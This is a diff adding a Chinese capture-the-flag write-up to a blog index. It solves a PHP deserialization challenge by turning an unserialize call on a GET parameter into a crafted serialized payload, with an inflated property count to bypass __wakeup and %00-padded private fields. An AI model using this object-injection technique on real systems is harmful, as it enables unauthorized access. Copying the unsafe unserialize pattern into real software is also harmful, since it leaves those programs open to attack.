@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>极客大挑战:2019-PHP</title>
+      <link href="2021/06/11/ji-ke-da-tiao-zhan-2019-php/"/>
+      <url>2021/06/11/ji-ke-da-tiao-zhan-2019-php/</url>
+      
+        <content type="html"><![CDATA[<p>dirsearch扫描下载<a href="http://www.zip/">www.zip</a></p><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre><code> &lt;?php    include 'class.php';    $select = $_GET['select'];    $res=unserialize(@$select);    ?&gt;</code></pre><h3 id="class-php"><a href="#class-php" class="headerlink" title="class.php"></a>class.php</h3><pre><code>&lt;?phpinclude 'flag.php';error_reporting(0);class Name{    private $username = 'nonono';    private $password = 'yesyes';    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = 'guest';    }    function __destruct(){        if ($this-&gt;password != 100) {            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";            echo "You name is: ";            echo $this-&gt;username;echo "&lt;/br&gt;";            echo "You password is: ";            echo $this-&gt;password;echo "&lt;/br&gt;";            die();        }        if ($this-&gt;username === 'admin') {            global $flag;            echo $flag;        }else{            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";            die();        }    }}?&gt;</code></pre><p>用户名为admin，密码为100则可以输出flag</p><pre><code>&lt;?phpclass Name{    private $username = 'admin';    private $password = '100';}$a = new Name();echo serialize($a);?&gt;</code></pre><p>结果：</p><pre><code>O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre><h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><pre><code>?select=O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre><p>然后就会扑街</p><p><img src="/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%EF%BC%9A2019-PHP.assets/image-20210611200534103.png" alt="image-20210611200534103"></p><p><strong>因为是private声明，我们需要在类名和字段名前面都会加上\0的前缀，看别人的wp了解在url栏中会出现\0有空白符，复制的时候会丢失，所以加上%00</strong></p><pre><code>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}</code></pre><p><img src="/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%EF%BC%9A2019-PHP.assets/image-20210611200620532.png" alt="image-20210611200620532"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>RoarCTF:2019-EasyCalc</title>
       <link href="2021/06/11/roarctf-2019-easycalc/"/>
       <url>2021/06/11/roarctf-2019-easycalc/</url>
